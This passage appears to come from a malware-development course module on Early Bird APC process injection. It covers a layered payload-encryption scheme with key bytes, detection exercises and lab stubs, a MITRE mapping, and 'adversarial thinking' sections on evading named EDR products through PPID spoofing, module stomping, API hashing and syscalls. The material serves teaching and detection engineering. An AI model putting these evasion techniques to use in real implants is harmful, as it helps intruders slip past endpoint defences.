| Sysmon Event ID 8 (CreateRemoteThread) | **N/A** | This event was never generated — APC injection doesn't create remote threads |
| ETW Threat Intelligence | **DEPENDS** | If the kernel driver monitors `NtQueueApcThread`, yes. If it only monitors user-mode APIs, no |
| YARA import strings | **NO** | Direct syscalls bypass the IAT — no import strings to match |
| Process tree analysis | **YES** | `unknown.exe → charmap.exe` is still suspicious regardless of how the injection is performed |
| RWX detection | **YES** | The memory protection change to RWX still happens (the syscall changes the page tables the same way) |

**Key insight**: Process-level signals (parent-child tree, process creation patterns) are more resilient than API-level signals (import tables, function hooks). This is why Stage 08 (indirect syscalls) exists — to bypass API-level detection while still being detectable at the process behavior level.
</details>

---

## Section 6: Multi-Layer Encryption Deep Dive

### Layer 1: Position Mask

```rust
fn demask(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ ((i as u8).wrapping_mul(0x37).wrapping_add(0x5A)))
        .collect()
}
```

This is a **position-dependent XOR**. Each byte is XORed with `(index * 0x37 + 0x5A) mod 256`. The mask sequence starts: `0x5A, 0x91, 0xC8, 0xFF, 0x36, 0x6D, ...`

**Purpose**: The AES ciphertext in `.rdata` would have identifiable statistical properties (uniform byte distribution, specific block alignment). The position mask disrupts these patterns, making the blob look like unrelated data.

**Reversibility**: Apply the same function — XOR is its own inverse.

### Layer 2: AES (RC4) Decryption

```rust
let ciphertext = demask(MASKED_SHELLCODE);           // 318 bytes
let intermediate = aes::decrypt(&ciphertext, &AES_KEY)?;  // → 302 bytes
```

The `aes::decrypt()` function in the common library actually implements RC4 (a stream cipher), not AES (a block cipher). The naming is intentional mislabeling to confuse analysts who grep for "AES" and expect block cipher patterns.

Output: 302-byte XOR'd intermediate. First byte is `0x38` — NOT a shellcode signature.

### Layer 3: XOR (Remote-Side)

```
intermediate[i] ^ INNER_KEY[i % 16] = shellcode[i]
```

The 16-byte `INNER_KEY`:
```
0xd1, 0x7b, 0xe3, 0x4c, 0x85, 0xf0, 0x29, 0xa6,
0x3d, 0x92, 0x58, 0xc7, 0x0e, 0xb4, 0x6f, 0x13
```

This layer is removed by the decoder stub running inside charmap.exe, not by the injector.

### Exercise 6.1: Known-Plaintext Attack

**Question**: You know that x64 shellcode commonly starts with `0xE9` (near JMP) or `0xFC` (CLD). Given the intermediate's first byte is `0x38`, can you recover the first byte of `INNER_KEY`?

<details>
<summary>Answer</summary>

If the shellcode starts with `0xE9`:
```
intermediate[0] XOR INNER_KEY[0] = shellcode[0]
0x38 XOR INNER_KEY[0] = 0xE9
INNER_KEY[0] = 0x38 XOR 0xE9 = 0xD1
```

Check: `INNER_KEY[0]` is indeed `0xD1`. The known-plaintext attack works.

If the shellcode started with `0xFC` instead:
```
INNER_KEY[0] = 0x38 XOR 0xFC = 0xC4
```
This would give `0xC4`, which doesn't match the actual key. So we can determine that the shellcode starts with `0xE9`, not `0xFC`.

**Key takeaway**: Single-byte XOR with known plaintext is trivially breakable. The security of the XOR layer relies on it being the THIRD layer — an analyst must first deobfuscate the position mask and decrypt the AES/RC4 layer before they can even attempt the known-plaintext attack. The XOR layer's purpose is **remote-side decryption** (keeping plaintext out of the injector's memory), not cryptographic strength.
</details>

---

## Section 7: Comparison — Stage 05 vs Stage 06

Both stages use the same `apc.rs` injection module with the same `inject_with_decoder()` function — they are **architectural variants** with different keys and targets:

| Aspect | Stage 05 (`inject_with_decoder`) | Stage 06 (`inject_with_decoder`) |
|--------|----------------------------------|----------------------------------|
| **Encryption layers** | 3 (position mask + AES + XOR) | 3 (position mask + AES + XOR) |
| **Plaintext in injector?** | No (only intermediate) | No (only intermediate) |
| **Remote-side decryption?** | Yes (41-byte stub) | Yes (41-byte stub) |
| **Memory protection** | RWX (0x40) | RWX (0x40) |
| **Payload written** | [stub + key + intermediate] = 359B | [stub + key + intermediate] = 359B |
| **Target process** | charmap.exe | notepad.exe |
| **AES_KEY** | `0xb7, 0x3a, ...` (unique) | `0xe4, 0x2b, ...` (unique) |
| **INNER_KEY** | `0xd1, 0x7b, ...` (unique) | `0x8a, 0x3e, ...` (unique) |
| **Intermediate byte 0** | `0x38` | `0x63` |

### Exercise 7.1: Variant Detection Strategy

**Question**: You're an AV analyst who has signatured Stage 05's encrypted blob. A new sample (Stage 06) appears. Your signature misses it. What detection approach would catch BOTH variants?

<details>
<summary>Answer</summary>

**Per-variant content signatures fail** because different keys produce entirely different encrypted blobs. Instead, target **technique invariants**:

1. **Decoder stub bytes**: The 41-byte stub is identical across both variants. Signature the `lea rdi, [rip+0x22]` prologue and XOR loop pattern.

2. **`demask()` constants**: The position mask multiplier `0x37` and addend `0x5A` are invariant. These appear as immediate operands in the binary.

3. **Behavioral patterns**: Both variants spawn a GUI process (charmap/notepad) in suspended state from an unusual parent. A Sigma/YARA rule targeting the parent-child anomaly catches any target.

4. **KUSER_SHARED_DATA access**: Both read `0x7FFE0320` — this is a 4-byte constant visible in the binary.

5. **RWX cross-process**: Both call `VirtualProtectEx` with `PAGE_EXECUTE_READWRITE` (0x40) on a remote process.

The best approach combines static (stub bytes + constants) and behavioral (process tree + RWX) detection for resilience against future variants.
</details>

---

## Section 8: Hands-On Lab — Building APC Injection Detectors

### Lab 8.1: Process Tree Anomaly Detector

Write a Python script that monitors for suspicious parent-child process relationships:

```python
#!/usr/bin/env python3
"""Detect suspicious parent-child process relationships indicative of Early Bird APC."""

# Key detection logic:
# 1. Monitor Sysmon Event ID 1 (ProcessCreate) or ETW process creation
# 2. For each new process:
#    a. Check if the child is a common injection target
#       (charmap.exe, notepad.exe, mspaint.exe, calc.exe)
#    b. Check if the parent is NOT a known legitimate launcher
#       (explorer.exe, cmd.exe, powershell.exe)
#    c. Flag unusual parent-child pairs
# 3. Correlate with VirtualAllocEx / VirtualProtectEx calls
#    (if ETW Kernel-Memory provider is available)
#
# Expected output:
# {"timestamp": "...", "parent": "unknown.exe", "child": "charmap.exe",
#  "parent_pid": 1234, "child_pid": 5678, "verdict": "SUSPICIOUS_EARLY_BIRD"}
```

### Lab 8.2: RWX Memory Scanner

Write a script that scans a specific process for RWX memory regions:

```python
#!/usr/bin/env python3
"""Scan process for RWX memory regions (decoder stub indicator)."""
import ctypes
from ctypes import wintypes

# Key detection logic:
# 1. Open target process with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
# 2. Enumerate memory regions with VirtualQueryEx
# 3. Flag regions that are:
#    a. PAGE_EXECUTE_READWRITE (0x40)
#    b. MEM_COMMIT
#    c. NOT backed by a file (Type != MEM_IMAGE)
# 4. For flagged regions, dump first 64 bytes
# 5. Check for RIP-relative LEA pattern: 48 8D 3D (stub signature)
#
# Expected output:
# {"pid": 5678, "address": "0x...", "size": 4096, "protection": "RWX",
#  "first_bytes": "488d3d...", "has_stub_signature": true}
```

### Exercise 8.1: Write a KUSER_SHARED_DATA Monitor

**Task**: Write a script that detects processes reading `KUSER_SHARED_DATA.TickCountQuad` at `0x7FFE0320`.

**Hint**: You can't detect this with API hooking (there's no API call). You would need:
- Hardware breakpoint on read access to `0x7FFE0320` (via x64dbg or kernel driver)
- ETW with Microsoft-Windows-Kernel-Memory provider (if it exposes page-level access)
- Code analysis (static or dynamic) to find the `mov rax, [0x7FFE0320]` instruction

This exercise demonstrates why direct memory access techniques are fundamentally harder to detect than API calls.

---

## Section 9: MITRE ATT&CK Mapping

| Technique | ID | Stage 05 Implementation |
|-----------|-----|------------------------|
| Process Injection: Asynchronous Procedure Call | **T1055.004** | QueueUserAPC on suspended thread |
| Native API | T1106 | CreateProcessW, VirtualAllocEx, QueueUserAPC |
| Obfuscated Files or Information | T1027 | Triple encryption (position mask + AES + XOR) |
| Virtualization/Sandbox Evasion: Time-Based | T1497.003 | KUSER_SHARED_DATA uptime check |
| Defense Evasion | TA0005 | Execute in charmap.exe context |

**Note**: The correct sub-technique is **T1055.004 (APC)**, NOT T1055.001 (DLL Injection) or T1055.003 (Thread Execution Hijacking).

---

## Section 9B: Adversarial Thinking — Evolving the Injection

You've learned the Early Bird APC injection chain and written detection rules. Now think like the attacker: how would you evolve this technique to bypass YOUR detections?

### Challenge 1: Eliminate the Parent-Child Signal

Your Sigma rule catches "unusual parent spawning charmap.exe." How does the attacker eliminate this?

<details>
<summary>Approaches</summary>

1. **PPID Spoofing**: Use `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to make charmap.exe appear as a child of explorer.exe instead of the injector. The real parent is hidden from Sysmon Event 1
2. **Target existing process**: Instead of spawning charmap, inject into an ALREADY RUNNING process (notepad, explorer, svchost). No new process creation = no Event 1 parent-child signal. But requires `OpenProcess` (Sysmon Event 10)
3. **Indirect execution**: Have a legitimate program (e.g., cmd.exe) spawn charmap. The injector calls `CreateProcessW("cmd.exe /c start charmap.exe")` — the parent chain becomes `injector → cmd → charmap`, and charmap's parent is cmd.exe (normal)
4. **Self-injection**: Don't inject into another process at all — return to Stages 01-04's local execution model but with better evasion layers. Cross-process is not always worth the detection cost

**The lesson**: Every evasion creates a new detection surface. PPID spoofing is itself detectable (the real parent process doesn't have certain handle relationships). There's no free lunch.
</details>

### Challenge 2: Eliminate the RWX Signal

Your detection flags `PAGE_EXECUTE_READWRITE` in cross-process allocations. How does the attacker avoid this?

<details>
<summary>Approaches</summary>

1. **Pre-decrypt before writing**: Instead of writing encrypted data and a decoder stub, decrypt everything in the injector first, then write plaintext shellcode. Use RW→RX (no RWX needed). But this puts plaintext shellcode in the injector's memory (what Stage 05 was designed to avoid)
2. **Two-allocation approach**: Allocate TWO regions in the target — one RW (for data) and one RX (for code). Write the decoder stub to the RX region (it's pure code, no writes needed). Write the encrypted data to the RW region. The stub reads from RW and writes to itself... wait, it can't write to RX. This doesn't work for in-place decryption
3. **Module stomping** (Stage 12): Load a legitimate DLL in the target process, overwrite its `.text` section (which is already RX, but you change it to RW, write, then change back to RX). No new allocation — the code lives inside a "legitimate" module
4. **ROP/JOP decryption**: Build a return-oriented or jump-oriented program that uses existing executable gadgets in the target to perform the XOR decryption, writing to a separate RW region, then VirtualProtect the result to RX. No RWX at any point. Extremely complex to implement

Stage 12 (Module Stomping) solves this problem elegantly — it's the natural evolution of Stage 05.
</details>

### Challenge 3: Eliminate the IAT Signal

CrowdStrike and Elastic flag this binary because CreateProcessW + VirtualAllocEx + WriteProcessMemory + QueueUserAPC appear together in the IAT. How do you hide them?

<details>
<summary>Approaches</summary>

1. **PEB-walking API hashing** (Stage 04 technique): Resolve all injection APIs via hash lookup instead of importing them. Removes them from IAT. But adds PEB-walk code pattern that triggers ESET Agent.ION
2. **Direct syscalls** (Stage 07): Skip both IAT and kernel32.dll — issue Nt* syscalls directly. No IAT entries, no PEB walking. But the `syscall` instruction itself is a detection signal (Huorong)
3. **Indirect syscalls** (Stage 08): Jump into ntdll's syscall stubs. Return address appears legitimate. Best of both worlds — no IAT, no PEB walk, no suspicious `syscall` instruction in your code
4. **Dynamic LoadLibrary + GetProcAddress**: Import only GetProcAddress and LoadLibraryA (benign). Resolve everything else at runtime. Middle ground — two benign IAT entries instead of six offensive ones

This progression (direct IAT → PEB hashing → direct syscalls → indirect syscalls) IS the course progression from Stage 04 through Stage 08. Each solves the previous stage's detection problem while creating a new one.
</details>

---

## Section 10: Knowledge Check

Test your understanding without looking back.

**1. Why does Early Bird APC injection NOT trigger Sysmon Event ID 8 (CreateRemoteThread)?**

<details>
<summary>Answer</summary>

Sysmon Event ID 8 specifically monitors `CreateRemoteThread` and `NtCreateThreadEx` with `THREAD_CREATE_FLAGS_CREATE_SUSPENDED` targeting a remote process. APC injection uses `QueueUserAPC` + `ResumeThread` — a completely different API path. Sysmon has NO dedicated event for APC queuing. Detection requires ETW providers (Microsoft-Windows-Threat-Intelligence) or process tree analysis (Event ID 1).

</details>

**2. The injected memory is PAGE_EXECUTE_READWRITE (0x40). Why can't W^X (RW→RX) be used like in Stages 01-04?**

<details>
<summary>Answer</summary>

The decoder stub must WRITE (XOR-decrypt the intermediate in-place) AND EXECUTE (run as code) in the same memory region. With W^X (RW then RX), the write happens first, then the protection changes. But here, the same CODE that writes is also the code that executes — the stub is part of the written buffer. The stub can't run until the memory is executable, and it can't decrypt until the memory is writable. Both must be true simultaneously → RWX is required.

An alternative: write the stub to one region (RX) and the data to another (RW). But this requires two allocations, two WriteProcessMemory calls, and RIP-relative addressing between non-adjacent regions — significantly more complex.

</details>

**3. You dump the injector's memory BEFORE WriteProcessMemory. Can you recover the plaintext shellcode?**

<details>
<summary>Answer</summary>

Yes, but not directly. You'll find:
- The `intermediate` (302 bytes, first byte `0x38`) — this is AES-decrypted but still XOR-encrypted
- The `INNER_KEY` (16 bytes) — stored as a local variable

Applying `intermediate[i] ^ INNER_KEY[i % 16]` recovers the plaintext. But automated scanners won't recognize the intermediate as shellcode because `0x38` doesn't match any known prologue. Manual analysis is required.

</details>

**4. What is the advantage of KUSER_SHARED_DATA over GetTickCount64() for uptime checking?**

<details>
<summary>Answer</summary>

`GetTickCount64()` is a kernel32.dll API call that EDR products can hook. Hooked versions can return fake values (e.g., reporting 24 hours of uptime on a 30-second-old sandbox). `KUSER_SHARED_DATA.TickCountQuad` at `0x7FFE0320` is a direct memory read from a kernel-mapped page — no API call is made, so there's nothing to hook in user-mode. The only way to intercept it is kernel-level monitoring (hardware breakpoints, hypervisor-based security).

</details>

**5. The binary spawns charmap.exe but could spawn any executable. From a detection perspective, what makes this EASIER to detect than injecting into an already-running process?**

<details>
<summary>Answer</summary>

Spawning a new process creates a Sysmon Event 1 (ProcessCreate) with the injector as the parent. This parent-child relationship is a strong behavioral signal — "why is unknown.exe spawning charmap.exe?"

Injecting into an already-running process avoids the parent-child signal (the target was already running) but generates Sysmon Event 10 (ProcessAccess) when `OpenProcess` is called with high access rights (PROCESS_ALL_ACCESS). Each approach has a different, complementary detection signal.

The "best" evasion depends on the target environment: if Sysmon Event 1 is monitored heavily, inject into existing processes. If Event 10 is monitored, spawn new ones. This is why threat actors profile the target's detection capabilities before choosing techniques.

</details>

**6. (Bonus) Stage 05 uses `common::injection::apc` which imports injection APIs via windows-sys. Stage 04 uses `common::evasion::apihash` which hides APIs via PEB walking. Could you combine both — use PEB walking to resolve the injection APIs?**

<details>
<summary>Answer</summary>

Yes — and this is approximately what real-world implants do. Resolve CreateProcessW, VirtualAllocEx, WriteProcessMemory, QueueUserAPC, and ResumeThread via PEB-walking hash resolution. The IAT would show zero injection APIs.

The trade-off: PEB-walking code patterns trigger ESET Agent.ION (sample-burned), while direct IAT imports trigger CrowdStrike/Elastic. In a fresh codebase (not sample-burned), PEB walking is the better choice because IAT analysis is widely automated while PEB-walk detection requires more sophisticated rules.

The Goodboy framework separated them into different stages for pedagogical clarity — each stage teaches ONE new concept. A production implant would combine the best techniques from multiple stages.

</details>

---

## Summary Table

| Concept | Stages 01-04 (Local) | Stage 05 (Early Bird APC + Decoder) | Stage 06 (Variant B — notepad.exe) |
|---------|---------------------|--------------------------------------|-------------------------------------|
| **Execution location** | Same process | charmap.exe | notepad.exe |
| **Process creation** | None | `CreateProcessW(SUSPENDED)` | `CreateProcessW(SUSPENDED)` |
| **Thread execution** | `CreateThread` | `QueueUserAPC` + `ResumeThread` | `QueueUserAPC` + `ResumeThread` |
| **Memory allocation** | `VirtualAlloc` | `VirtualAllocEx` | `VirtualAllocEx` |
| **Memory protection** | RW → RX (W^X) | RW → **RWX** | RW → **RWX** |
| **Encryption layers** | 1-2 | **3** (mask + AES + XOR) | **3** (mask + AES + XOR) |
| **Remote-side decryption** | N/A | **Yes** (41-byte stub) | **Yes** (41-byte stub) |
| **Plaintext in injector** | Yes | **No** | **No** |
| **API resolution** | PEB-walking hash | **windows-sys FFI** (IAT) | windows-sys FFI (IAT) |
| **Anti-sandbox** | Env checks | **KUSER_SHARED_DATA** | **KUSER_SHARED_DATA** |
| **MITRE technique** | T1620 | **T1055.004** | T1055.004 |
| **Sysmon Event ID 8** | N/A | **Not generated** | Not generated |
| **Key detection signal** | Executable private memory | **RWX + unusual parent-child** | **RWX + unusual parent-child** |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "APC injection is stealthier than CreateRemoteThread" | It bypasses Sysmon Event 8, but creates a suspicious parent-child process relationship that CRT injection avoids (CRT targets existing processes). Each technique has different detection surfaces, not universally "more" or "less" stealthy |
| "RWX memory is always detectable" | RWX regions are a strong signal, but some legitimate software uses them (JIT compilers, .NET, games). The signal is the COMBINATION: RWX + cross-process + small allocation + unusual process tree |
| "The plaintext shellcode is safe because it's in charmap.exe" | The shellcode exists in plaintext in charmap's RWX region after the stub decrypts it. pe-sieve or Moneta scanning charmap will find it. The protection is temporal — the injector doesn't hold it, but the target does |
| "KUSER_SHARED_DATA is unhookable" | User-mode hooks can't intercept it (it's a direct memory read). But kernel-mode monitoring CAN detect it — a driver can set a hardware breakpoint on `0x7FFE0320`. Hypervisor-based security can also intercept the page access |
| "Triple encryption provides triple the security" | Each layer serves a DIFFERENT purpose: position mask defeats entropy analysis, AES/RC4 provides confidentiality, XOR enables remote-side decryption. They're not additive security — they're targeted at different analysis techniques |
| "Direct IAT imports are safer than API hashing for this stage" | MEMORY.md lesson: direct IAT imports for injection APIs (CreateProcessW, VirtualAllocEx, WriteProcessMemory) are what triggered CrowdStrike and Elastic detections. Stages 01-04 avoided this by using PEB-walking. The trade-off: hide from IAT analysis (PEB walk) or hide from code-pattern analysis (direct IAT) — you can't hide from both |

### What Breaks at Stage 06 — The Bridge

Stage 06 uses the SAME `inject_with_decoder()` function with different keys and notepad.exe as the target. The techniques are identical. The value is in the COMPARISON — same technique, different target, different keys, different detection profile.

After Stage 06, the focus shifts entirely. Stages 07-08 introduce **syscalls** — bypassing the entire usermode API layer. Stages 09-10 add **anti-analysis**. The injection foundation established in Stages 05-06 is assumed knowledge for everything that follows.

### Further Reading (2025-2026)

**Injection techniques:**
- [Avantguard: Threadless Ops](https://avantguard.io/en/blog/threadless-ops) — Next-gen injection without threads or APCs (2025)
- [kr0tt: Early Exception Handling](https://kr0tt.github.io/posts/early-exception-handling/) — Injection without VEH/SEH (2025)
- [Maldev Academy: GhostlyHollowing](https://github.com/Maldev-Academy/GhostlyHollowingViaTamperedSyscalls2) — Tampered syscalls for PE injection (Jan 2026)
- [Oblivion: Advanced Module Stomping + Heap/Stack Encryption](https://oblivion-malware.xyz/posts/advanced-module-stomping-heap-stack-enc/) — Combining injection with sleep obfuscation (2025)
- [cocomelonc: Process Injection 1-21](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html) — Complete injection technique catalog in C

**Detection:**
- [WindShock: Endpoint Evasion 2020-2025](https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/) — How injection techniques evolved against EDR
- [0xHossam: AV/EDR Evasion Part 4](https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e) — Sleep obfuscation + indirect syscalls for injection evasion
